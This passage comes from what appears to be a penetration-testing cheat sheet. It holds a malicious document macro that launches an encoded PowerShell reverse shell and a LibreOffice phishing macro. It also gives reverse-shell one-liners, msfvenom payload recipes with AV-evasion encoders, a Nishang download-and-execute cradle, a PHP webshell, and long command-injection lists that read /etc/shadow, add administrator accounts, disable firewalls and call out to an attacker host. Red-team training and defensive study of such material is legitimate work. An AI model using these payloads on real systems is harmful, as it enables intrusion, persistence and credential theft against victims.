    Str = Str + "AIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AV"
    Str = Str + "ABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQA"
    Str = Str + "uAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwA"
    Str = Str + "CwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACg"
    Str = Str + "AaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8Ad"
    Str = Str + "QB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQB"
    Str = Str + "jAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiA"
    Str = Str + "FAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
    Str = Str + "AIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAK"
    Str = Str + "ABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQB"
    Str = Str + "TAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuA"
    Str = Str + "GQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGk"
    Str = Str + "AdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAb"
    Str = Str + "gBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgB"
    Str = Str + "lAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuA"
    Str = Str + "HQALgBDAGwAbwBzAGUAKAApAA=="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

### Libre Office Phishing Macro

```console
Sub Main

    Shell("cmd.exe /c powershell -e JAjA<--- CUT FOR BREVITY --->AA==")
    
End Sub
```

Now `assign` the `macro` to an `event`.

*Tools > Customize > Events > Open Document*

## marco_pack

```console
PS C:\macro_pack_pro> echo .\<FILE>.bin | marco_pack.exe -t SHELLCODE -G .\<FILE>.pdf.lnk --icon='C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13' --hta-macro --bypass
```

## Markdown Reverse Shell

```console
--';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
```

## mkfifo Reverse Shell

```console
$ mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
```

## msfvenom

### Basic Commands

```console
$ msfvenom -l payloads       // list payloads
$ msfvenom --list formats    // list formats for payloads
```

### Common Payloads

```console
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > <FILE>.elf
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f WAR > <FILE>.war
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e php/base64 -f raw
$ msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
$ msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o "r'<FILE>.exe"
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <FILE>.aspx
$ msfvenom -p windows/x64/exec CMD='\\<LHOST>\PATH\TO\SHARE\nc.exe <LHOST> <LPORT> -e cmd.exe' -f dll > <FILE>.dll
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <FILE>.aspx
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b '\x00' -f exe    # -b is bad bytes
$ msfvenom -p windows/meterpreter/reverse_http LHOST=<LHOST> LPORT=<LPORT> HttpUserAgent=<HEADER> -f exe -o <FILE>.exe
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <FILE>.aspx
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10 -x ./putty.exe -k
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f c
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f csharp
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10 -x ./putty.exe -k
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread PREPENDMIGRATE=true PREPENDMIGRATEPROC=explorer.exe -f exe -o <FILE>.exe -e x64/zutto_dekiru -i 10 -x ./putty.exe -k
```

## Netcat Reverse Shell

```console
$ nc -e /bin/sh <LHOST> <LPORT>
```

## Nishang

> https://github.com/samratashok/nishang

### Reverse-TCP Shell for Windows

```console
$ cd PATH/TO/nishang/Shells/
$ cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
```

Choose which variant you require, copy and put it at the end of the file.

```console
tail -3 Invoke-PowerShellTcp.ps1 
}

Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
```

```cmd
C:\> powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
```

## Non-alphanumeric Webshell

> https://gist.github.com/0xSojalSec/5bee09c7035985ddc13fddb16f191075

```console
<?=`{${~"\xa0\xb8\xba\xab"}["\xa0"]}`;
```

```console
$ echo -ne '<?=`{${~\xa0\xb8\xba\xab}[\xa0]}`;' > rev_shell.php
```

## ntml_theft

```console
$ python3 ntlm_theft.py --generate all --server <RHOST> --filename <FOLDER>
```

## OS Command Injection

### Linux

```console
%0Acat%09/etc/passwd<&0
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
/index.html|id|
;id;
;id
;netstat -a;
;system('cat%20/etc/passwd')
;id;
|id
|/usr/bin/id
|id|
|/usr/bin/id|
||/usr/bin/id|
|id;
||/usr/bin/id;
;id|
;|/usr/bin/id|
\n/bin/ls -al\n
\n/usr/bin/id\n
\nid\n
\n/usr/bin/id;
\nid;
\n/usr/bin/id|
\nid|
;/usr/bin/id\n
;id\n
|usr/bin/id\n
|nid\n
`id`
`/usr/bin/id`
a);id
a;id
a);id;
a;id;
a);id|
a;id|
a)|id
a|id
a)|id;
a|id
|/bin/ls -al
a);/usr/bin/id
a;/usr/bin/id
a);/usr/bin/id;
a;/usr/bin/id;
a);/usr/bin/id|
a;/usr/bin/id|
a)|/usr/bin/id
a|/usr/bin/id
a)|/usr/bin/id;
a|/usr/bin/id
;system('cat%20/etc/passwd')
;system('id')
;system('/usr/bin/id')
%0Acat%20/etc/passwd
%0A/usr/bin/id
%0Aid
%0A/usr/bin/id%0A
%0Aid%0A
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
%0a ping -i 30 127.0.0.1 %0a
`ping 127.0.0.1`
| id
& id
; id
%0a id %0a
`id`
$;/usr/bin/id
() { :;}; /bin/bash -c "curl http://<RHOST>/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
() { :;}; /bin/bash -c "curl http://<RHOST>/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
() { :;}; /bin/bash -c "curl http://<RHOST>/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
() { :;}; /bin/bash -c "curl http://<RHOST>/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
() { :;}; /bin/bash -c "curl http://<RHOST>/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
() { :;}; /bin/bash -c "curl http://<RHOST>/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
() { :;}; /bin/bash -c "curl http://<RHOST>/.testing/shellshock.txt?vuln=5"
() { :;}; /bin/bash -c "sleep 1 && curl http://<RHOST>/.testing/shellshock.txt?sleep=1&?vuln=6"
() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
() { :;}; /bin/bash -c "sleep 3 && curl http://<RHOST>/.testing/shellshock.txt?sleep=3&?vuln=7"
() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
() { :;}; /bin/bash -c "sleep 6 && curl http://<RHOST>/.testing/shellshock.txt?sleep=6&?vuln=8"
() { :;}; /bin/bash -c "sleep 6 && curl http://<RHOST>/.testing/shellshock.txt?sleep=9&?vuln=9"
() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
() { :;}; /bin/bash -c "wget http://<RHOST>/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
() { :;}; /bin/bash -c "wget http://<RHOST>/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
() { :;}; /bin/bash -c "wget http://<RHOST>/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
() { :;}; /bin/bash -c "wget http://<RHOST>/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
() { :;}; /bin/bash -c "wget http://<RHOST>/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
() { :;}; /bin/bash -c "wget http://<RHOST>/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
() { :;}; /bin/bash -c "wget http://<RHOST>/.testing/shellshock.txt?vuln=4"
cat /etc/hosts
$(`cat /etc/passwd`)
cat /etc/passwd
%0Acat%20/etc/passwd
{{ get_user_file("/etc/passwd") }}
<!--#exec cmd="/bin/cat /etc/passwd"-->
<!--#exec cmd="/bin/cat /etc/shadow"-->
<!--#exec cmd="/usr/bin/id;-->
system('cat /etc/passwd');
<?php system("cat /etc/passwd");?>
```

### Windows

```console
`
|| 
| 
; 
'
'"
"
"'
& 
&& 
%0a
%0a%0d

%0Aid
%0a id %0a
%0Aid%0A
%0a ping -i 30 127.0.0.1 %0a
%0A/usr/bin/id
%0A/usr/bin/id%0A
%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
%20{${phpinfo()}}
%20{${sleep(20)}}
%20{${sleep(3)}}
a|id|
a;id|
a;id;
a;id\n
() { :;}; curl http://<RHOST>/.testing/shellshock.txt?vuln=12
| curl http://<RHOST>/.testing/rce.txt
& curl http://<RHOST>/.testing/rce.txt
; curl http://<RHOST>/.testing/rce_vuln.txt
&& curl http://<RHOST>/.testing/rce_vuln.txt
curl http://<RHOST>/.testing/rce_vuln.txt
 curl http://<RHOST>/.testing/rce_vuln.txt ||`curl http://<RHOST>/.testing/rce_vuln.txt` #' |curl http://<RHOST>/.testing/rce_vuln.txt||`curl http://<RHOST>/.testing/rce_vuln.txt` #\" |curl http://<RHOST>/.testing/rce_vuln.txt
curl http://<RHOST>/.testing/rce_vuln.txt ||`curl http://<RHOST>/.testing/rce_vuln.txt` #' |curl http://<RHOST>/.testing/rce_vuln.txt||`curl http://<RHOST>/.testing/rce_vuln.txt` #\" |curl http://<RHOST>/.testing/rce_vuln.txt
$(`curl http://<RHOST>/.testing/rce_vuln.txt?req=22jjffjbn`)
dir
| dir
; dir
$(`dir`)
& dir
&&dir
&& dir
| dir C:\
; dir C:\
& dir C:\
&& dir C:\
dir C:\
| dir C:\Documents and Settings\*
; dir C:\Documents and Settings\*
& dir C:\Documents and Settings\*
&& dir C:\Documents and Settings\*
dir C:\Documents and Settings\*
| dir C:\Users
; dir C:\Users
& dir C:\Users
&& dir C:\Users
dir C:\Users
;echo%20'<script>alert(1)</script>'
echo '<img src=http://<RHOST>/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
| echo "<?php include($_GET['page'])| ?>" > rfi.php
; echo "<?php include($_GET['page']); ?>" > rfi.php
& echo "<?php include($_GET['page']); ?>" > rfi.php
&& echo "<?php include($_GET['page']); ?>" > rfi.php
echo "<?php include($_GET['page']); ?>" > rfi.php
| echo "<?php system('dir $_GET['dir']')| ?>" > dir.php 
; echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
&& echo "<?php system('dir $_GET['dir']'); ?>" > dir.php 
echo "<?php system('dir $_GET['dir']'); ?>" > dir.php
| echo "<?php system($_GET['cmd'])| ?>" > cmd.php
; echo "<?php system($_GET['cmd']); ?>" > cmd.php
& echo "<?php system($_GET['cmd']); ?>" > cmd.php
&& echo "<?php system($_GET['cmd']); ?>" > cmd.php
echo "<?php system($_GET['cmd']); ?>" > cmd.php
;echo '<script>alert(1)</script>'
echo '<script>alert(1)</script>'// XXXXXXXXXXX
echo '<script src=http://<RHOST>/.testing/xss.js></script>'// XXXXXXXXXXX
| echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
; echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
&& echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
echo "use Socket;$i="192.168.16.151";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
() { :;}; echo vulnerable 10
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
eval('ls')
eval('pwd')
eval('pwd');
eval('sleep 5')
eval('sleep 5');
eval('whoami')
eval('whoami');
exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
exec('ls')
exec('pwd')
exec('pwd');
exec('sleep 5')
exec('sleep 5');
exec('whoami')
exec('whoami');
;{$_GET["cmd"]}
`id`
|id
| id
;id
;id|
;id;
& id
&&id
;id\n
ifconfig
| ifconfig
; ifconfig
& ifconfig
&& ifconfig
/index.html|id|
ipconfig
| ipconfig /all
; ipconfig /all
& ipconfig /all
&& ipconfig /all
ipconfig /all
ls
$(`ls`)
| ls -l /
; ls -l /
& ls -l /
&& ls -l /
ls -l /
| ls -laR /etc
; ls -laR /etc
& ls -laR /etc
&& ls -laR /etc
| ls -laR /var/www
; ls -laR /var/www
& ls -laR /var/www
&& ls -laR /var/www
| ls -l /etc/
; ls -l /etc/
& ls -l /etc/
&& ls -l /etc/
ls -l /etc/
ls -lh /etc/
| ls -l /home/*
; ls -l /home/*
& ls -l /home/*
&& ls -l /home/*
ls -l /home/*
*; ls -lhtR /var/www/
| ls -l /tmp
; ls -l /tmp
& ls -l /tmp
&& ls -l /tmp
ls -l /tmp
| ls -l /var/www/*
; ls -l /var/www/*
& ls -l /var/www/*
&& ls -l /var/www/*
ls -l /var/www/*
\n
\n\033[2curl http://<RHOST>/.testing/term_escape.txt?vuln=1?user=\`whoami\`
\n\033[2wget http://<RHOST>/.testing/term_escape.txt?vuln=2?user=\`whoami\`
\n/bin/ls -al\n
| nc -lvvp 4444 -e /bin/sh|
; nc -lvvp 4444 -e /bin/sh;
& nc -lvvp 4444 -e /bin/sh&
&& nc -lvvp 4444 -e /bin/sh &
nc -lvvp 4444 -e /bin/sh
nc -lvvp 4445 -e /bin/sh &
nc -lvvp 4446 -e /bin/sh|
nc -lvvp 4447 -e /bin/sh;
nc -lvvp 4448 -e /bin/sh&
\necho INJECTX\nexit\n\033[2Acurl http://<RHOST>/.testing/rce_vuln.txt\n
\necho INJECTX\nexit\n\033[2Asleep 5\n
\necho INJECTX\nexit\n\033[2Awget http://<RHOST>/.testing/rce_vuln.txt\n
| net localgroup Administrators hacker /ADD
; net localgroup Administrators hacker /ADD
& net localgroup Administrators hacker /ADD
&& net localgroup Administrators hacker /ADD
net localgroup Administrators hacker /ADD
| netsh firewall set opmode disable
; netsh firewall set opmode disable
& netsh firewall set opmode disable
&& netsh firewall set opmode disable
netsh firewall set opmode disable
netstat
;netstat -a;
| netstat -an
; netstat -an
& netstat -an
&& netstat -an
netstat -an
| net user hacker Password1 /ADD
; net user hacker Password1 /ADD
& net user hacker Password1 /ADD
&& net user hacker Password1 /ADD
net user hacker Password1 /ADD
| net view
; net view
& net view
&& net view
net view
\nid|
\nid;
\nid\n
\n/usr/bin/id\n
perl -e 'print "X"x1024'
|| perl -e 'print "X"x16096'
| perl -e 'print "X"x16096'
; perl -e 'print "X"x16096'
& perl -e 'print "X"x16096'
&& perl -e 'print "X"x16096'
perl -e 'print "X"x16384'
; perl -e 'print "X"x2048'
& perl -e 'print "X"x2048'
&& perl -e 'print "X"x2048'
perl -e 'print "X"x2048'
|| perl -e 'print "X"x4096'
| perl -e 'print "X"x4096'
; perl -e 'print "X"x4096'
& perl -e 'print "X"x4096'
&& perl -e 'print "X"x4096'
perl -e 'print "X"x4096'
|| perl -e 'print "X"x8096'
| perl -e 'print "X"x8096'
; perl -e 'print "X"x8096'
&& perl -e 'print "X"x8096'
perl -e 'print "X"x8192'
perl -e 'print "X"x81920'
|| phpinfo()
| phpinfo()
 {${phpinfo()}}
;phpinfo()
;phpinfo();//
';phpinfo();//
{${phpinfo()}}
& phpinfo()
&& phpinfo()
phpinfo()
phpinfo();
<?php system("curl http://<RHOST>/.testing/rce_vuln.txt?method=phpsystem_get");?>
<?php system("curl http://<RHOST>/.testing/rce_vuln.txt?req=df2fkjj");?>
<?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
<?php system("sleep 10");?>
<?php system("sleep 5");?>
<?php system("wget http://<RHOST>/.testing/rce_vuln.txt?method=phpsystem_get");?>
<?php system("wget http://<RHOST>/.testing/rce_vuln.txt?req=jdfj2jc");?>
:phpversion();
`ping 127.0.0.1`
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
;${@print(md5(RCEVulnerable))};
${@print("RCEVulnerable")}
${@print(system($_SERVER['HTTP_USER_AGENT']))}
pwd
| pwd
; pwd
& pwd
&& pwd
\r
| reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
&& reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
\r\n
route
| sleep 1
; sleep 1
& sleep 1
&& sleep 1
sleep 1
|| sleep 10
| sleep 10
; sleep 10
{${sleep(10)}}
& sleep 10 
&& sleep 10
sleep 10
|| sleep 15
| sleep 15
; sleep 15
& sleep 15 
&& sleep 15
 {${sleep(20)}}
{${sleep(20)}}
 {${sleep(3)}}
{${sleep(3)}}
| sleep 5
; sleep 5
& sleep 5
&& sleep 5
sleep 5
 {${sleep(hexdec(dechex(20)))}} 
{${sleep(hexdec(dechex(20)))}} 
sysinfo
| sysinfo
; sysinfo
& sysinfo
&& sysinfo
system('cat C:\boot.ini');
system('cat config.php');
|| system('curl http://<RHOST>/.testing/rce_vuln.txt');
